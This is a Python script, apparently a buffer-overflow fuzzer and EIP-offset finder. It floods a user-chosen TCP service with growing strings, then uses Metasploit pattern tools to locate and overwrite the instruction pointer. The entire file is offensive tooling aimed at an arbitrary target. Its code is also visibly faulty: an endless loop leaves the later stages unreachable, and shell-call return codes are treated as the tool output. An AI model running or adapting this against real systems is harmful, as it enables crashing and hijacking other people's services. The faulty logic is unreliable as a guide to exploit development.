


import socket
import os
import time
import sys 
print("""


ip:target
port:target
prefix:prefix target
timeanswer:2 e.g.
""")
ip=str(input("[*]ip: "))
port=int(input("[*]port: "))
prefix=str(input("[*]prefix: "))
timeanswer=int(input("[*]areyoutimeoutorpresenter "))
if timeanswer<0:
    print("timeout: 2")
    timeanswer=2
string=prefix+"A"*100
print(f"[+]{ip}/{port}")
print("[*]started fuzz...")
while 1:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
        s.settimeout(timeanswer)
        s.connect((ip,port))
        s.recv(1024)
        print("[+]fuzzing with crash at ({})".format(len(string)-len(prefix)))
        s.send(bytes(string,"latin-1"))
        s.recv(1024)
        os.system("clear")
    except:
        print(f"[+]fuzzing with crash at ({len(string)-len(prefix)})")
    string=string+"A"*10
    time.sleep(1)
ss=len(string)-len(prefix)
tt=os.system(f"msf-pattern_create -l {ss}")
tt2=str(tt)
input("target server not started or enter")
print(f"pattern={tt}")
time.sleep(0.5)
string=prefix+tt2
try:
    s.settimeout(timeanswer)
    s.connect((ip,port))
    s.send(bytes(string,"latin-1"))
except:
    print("...")
input("target server not started or enter")
time.sleep(0.5)
os.system("clear")
for i in range(3):
    print("[*]{}".format("."*i))
    time.sleep(0.3)
    os.system("clear")
eip=int(input("[*]Eip: "))
ff=os.system(f"msf-pattern_offset -l {ss} -q {eip}")
print(ff)
string=prefix+"A"*ff+"B"*4
try:
    s.settimeout(timeanswer)
    s.connect((ip,port))
    s.send(bytes(string,"latin-1"))
except:
    print("[+]good")

time.sleep(0.5)
